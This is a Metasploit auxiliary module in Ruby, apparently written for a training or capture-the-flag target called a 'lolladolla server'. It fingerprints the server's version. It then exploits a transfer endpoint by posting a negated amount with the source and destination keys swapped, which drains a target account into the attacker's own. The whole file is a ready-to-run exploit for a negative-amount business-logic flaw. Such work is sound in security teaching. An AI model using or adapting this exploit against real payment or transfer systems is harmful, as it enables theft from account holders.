
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	
	include Msf::Exploit::Remote::HttpClient

	def initialize()
		super(
			'Name' => 'Make Lolladollas',
			'Description' => 'Fill an account with lolladollas',
			'Author' => 'Dope Beats',
			'License' => MSF_LICENSE,
			'DefaultOptions' => {
				'RPORT' => 8080
			}
		)

		register_options(
			[
				OptString.new('PUBKEY', [true, 'The public key for the destination account']),
				OptString.new('TARGETKEY', [true, 'The public key for the target account']),
				OptString.new('AMOUNT', [true, 'The amount to transfer', 100]),
				OptString.new('PRIVKEY', [true, 'The private key for the destination account'])
			], self.class
		)
	end

	def check
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => normalize_uri('/')
		})
		
		if not res or res.code != 200
			return Exploit::CheckCode::Unknown
		end
		
		vprint_line("Got http success code")

		if res.to_s =~ /lolladolla server version -1.04/
			return Exploit::CheckCode::Appears
		elsif res.to_s =~ /lolladolla server/ 
			return Exploit::CheckCode::Detected
		end
	end

	def run
		res = send_request_cgi({
			'method' => 'POST',
			'uri' => normalize_uri('xfer'),
			'vars_post' => {
				'srcpubkey' => datastore['PUBKEY'],
				'amount' => -datastore['AMOUNT'],
				'destpubkey' => datastore['TARGETKEY'],
				'signature' => datastore['PRIVKEY']
			}
		})

		if not res or res.code != 200
			print_error("Unable to complete transfer")
			return
		end

		print_good("Transfer complete... Check your new balance")
	end
end

